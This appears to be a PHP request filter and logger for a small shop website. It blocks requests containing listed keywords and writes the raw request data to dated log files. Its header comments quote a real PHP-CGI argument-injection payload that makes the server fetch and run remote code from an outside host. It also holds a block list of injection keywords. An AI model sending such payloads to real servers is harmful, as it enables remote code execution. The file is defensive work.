<?php
///index.php?categoryID=+categoryID+
///?-n+-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp://btslbl.com/ubica.txt+
///?-n+-s+-d+default_mimetype%3dhd21tmls+

/*echo date('H:m:s Y-m-d');
echo '<pre>';
	print_r($_SESSION);
echo '</pre>';*/
$SQLI_SWITCH = 0;
$hack_arr = array( 'safe_mode', 
				   'disable_function',
				   'allow_url_fopen',
				   'allow_url_include',
				   'auto_prepend_file',
				   'default_mimetype',
				   'ACCEPTED',
				   '+UNION',
				   '+SELECT',
				   '+ORDER',
				   'char',
				   '+FROM',
				   '+WHERE',
				   '+AND',
				   '+OR',
				   '-n',
				   '-s',
				   '-d '
				   );
foreach ($hack_arr as $el)
{
	
	if(stristr($_SERVER['REQUEST_URI'], $el))
	{	
		//echo '111111111111111';
	//	exit();
		
		//header('Location: http://prokat.ho.com.ua');
		//exit();
		$SQLI_SWITCH = 1;
		
	}
}				   

$str_POST = '';
//as $key => $value
if(isset($_POST))
{
	foreach ($_POST as $key =>$elpost)
	{	
		$str_POST .=' '.$key.' => '.$elpost.';';	
		foreach ($hack_arr as $el)
		{			
			if(stristr($elpost, $el))
			{	
				//echo '111111111111111';
			//	exit();
			  //  header('Location: http://prokat.ho.com.ua');
			  //  exit();
			  $SQLI_SWITCH = 1;
			}
		}
	}

	
/*	echo '<pre>';
			print_r($_POST);
		echo '</pre>';
	echo '2222222222<br>';*/
	
}


$str_SESSION = '';
if(isset($_SESSION))
{
	foreach ($_SESSION as $key =>$elpost)
	{
		$str_SESSION .=' '.$key.' => '.$elpost.';';
		foreach ($hack_arr as $el)
		{
			
			if(stristr($elpost, $el))
			{	
				//echo '111111111111111';
			//	exit();
				//header('Location: http://prokat.ho.com.ua');
				//exit();
				$SQLI_SWITCH = 1;
			}
		}
	}
}

$str_GET = '';
if(isset($_GET))
{
	foreach ($_GET as $key =>$elpost)
	{
		$str_GET .=' '.$key.' => '.$elpost.';';
		
	}
}

if($SQLI_SWITCH == 1)
{
	logging($str_POST, $str_SESSION, $str_GET);
	exit();
	
}
logging($str_POST, $str_SESSION, $str_GET);
// var_dump(get_magic_quotes_gpc());
				   
//if()
//header('Location: http://www.firstchoice.co.uk/hotels/hotel-offers/hotel-only-all-inclusive-offers.html#egypt');
/*echo '<pre>';
			print_r($_GET);
		echo '</pre>';*/
if(isset($_GET))
{
	if(isset($_GET['categoryID'])) $_GET['categoryID'] = (int) $_GET['categoryID'];
	if(isset($_GET['productID'])) $_GET['productID'] = (int) $_GET['productID'];
	if(isset($_GET['idn'])) $_GET['idn'] = (int) $_GET['idn'];
	if(isset($_GET['x'])) $_GET['x'] = (int) $_GET['x'];
	if(isset($_GET['y'])) $_GET['y'] = (int) $_GET['y'];
	if(isset($_GET['offset'])) $_GET['offset'] = (int) $_GET['offset'];
	if(isset($_GET['show_aux_page'])) $_GET['show_aux_page'] = (int) $_GET['show_aux_page'];
	if(isset($_GET['searchstring'])) $_GET['searchstring'] = preg_replace('/[^A-Za-zа-яА-ЯъьЬЪЮёЁїЇіІ0-9- ]+/', '', $_GET['searchstring']); 
	if(isset($_GET['search_name'])) $_GET['search_name'] = preg_replace('/[^A-Za-zа-яА-ЯъьЬЪЮёЁїЇіІ0-9- ]+/', '', $_GET['search_name']); 
	if(isset($_GET['brend'])) $_GET['brend'] = preg_replace('/[^A-Za-zа-яА-ЯъьЬЪЮёЁїЇіІ0-9- ]+/', '', $_GET['brend']); 
	if(isset($_GET['sort1'])) $_GET['sort1'] = preg_replace('/[^A-Za-z]+/', '', $_GET['sort2']); 
	if(isset($_GET['sort1'])) $_GET['sort1'] = preg_replace('/[^A-Za-z]+/', '', $_GET['sort1']); 
	if(isset($_GET['sort'])) $_GET['sort'] = preg_replace('/[^A-Za-z]+/', '', $_GET['sort']); 
	if(isset($_GET['direction'])) $_GET['direction'] = preg_replace('/[^A-Za-z]+/', '', $_GET['direction']); 
	if(isset($_GET['direction1'])) $_GET['direction1'] = preg_replace('/[^A-Za-z]+/', '', $_GET['direction1']); 
	if(isset($_GET['direction2'])) $_GET['direction2'] = preg_replace('/[^A-Za-z]+/', '', $_GET['direction2']); 
	if(isset($_GET['show_all'])) $_GET['show_all'] = preg_replace('/[^A-Za-z]+/', '', $_GET['show_all']); 
	//$_GET['test'] = 'текст';
 	//$dir_name = preg_replace('/[^A-Za-zа-яА-ЯъьЬЪЮёЁїЇіІ0-9-]+/', '_', $url);
	//searchstring=%F2%E5%F1%F2&x=18&y=13&sort=name&direction=ASC
	/*echo '<pre>';
			print_r($_GET);
		echo '</pre>';*/
/*	for($i=0; $i<count($_GET);$i++)
	{
		//$_GET[$i] = (is_numeric( == 'int') ? intval($_POST["$query"]) : addslashes($_POST["$query"]);
		
	}*/
	
}


function  logging($str_POST, $str_SESSION, $str_GET)
{
	//================================ LOGGing===============================================================
	if (!is_dir('./log/'.date('Y-m-d')))  // ---- директория 
		{
			//---создать директорию
			if (mkdir('./log/'.date('Y-m-d'), 0755)) 
			{
	   			if( !file_exists('./log/'.date('Y-m-d').'/log.txt')) 
	   			{
					$fp = fopen('./log/'.date('Y-m-d').'/log.txt', "w"); // ("r" - считывать "w" - создавать "a" - добовлять к тексту), мы создаем файл
					$str = date('H:m:s Y-m-d').' = '.$_SERVER['REQUEST_TIME'];
					$str = $str.' = '.$_SERVER['REQUEST_URI'];
					$str = $str.'| $str_POST = ';
					$str = $str.$str_POST;
					$str = $str.'| $str_SESSION = ';
					$str = $str.$str_SESSION;
					$str = $str.'| $str_GET = ';
					$str = $str.$str_GET;		
					$str = $str.' = '.$_SERVER['HTTP_USER_AGENT']."\r\n";
					$res = fwrite($fp, $str);
					fclose ($fp);
				}
			}
		  //else die('Не удалось создать директории...');
		}
		else   // ------------------------------------файл txt 
		{
			
				if( !file_exists('./log/'.date('Y-m-d').'/log.txt'))  
	   			{
					$fp = fopen('./log/'.date('Y-m-d').'/log.txt', "w"); // ("r" - считывать "w" - создавать "a" - добовлять к тексту), мы создаем файл
					$str = date('H:m:s Y-m-d').' = '.$_SERVER['REQUEST_TIME'];
					$str = $str.' = '.$_SERVER['REQUEST_URI'];
					$str = $str.'| $str_POST = ';
					$str = $str.$str_POST;
					$str = $str.'| $str_SESSION = ';
					$str = $str.$str_SESSION;
					$str = $str.'| $str_GET = ';
					$str = $str.$str_GET;		
					$str = $str.' = '.$_SERVER['HTTP_USER_AGENT']."\r\n";
					$res = fwrite($fp, $str);
					fclose ($fp);
				}	
				else 
				{
				
					$fp = fopen('./log/'.date('Y-m-d').'/log.txt', "a"); // ("r" - считывать "w" - создавать "a" - добовлять к тексту), мы создаем файл
					$str = date('H:m:s Y-m-d').' = '.$_SERVER['REQUEST_TIME'];
					$str = $str.' = '.$_SERVER['REQUEST_URI'];
					$str = $str.'| $str_POST = ';
					$str = $str.$str_POST;
					$str = $str.'| $str_SESSION = ';
					$str = $str.$str_SESSION;
					$str = $str.'| $str_GET = ';
					$str = $str.$str_GET;		
					$str = $str.' = '.$_SERVER['HTTP_USER_AGENT']."\r\n";
					$res = fwrite($fp, $str);
					fclose ($fp);
				}
		}
	
	return;
}
?>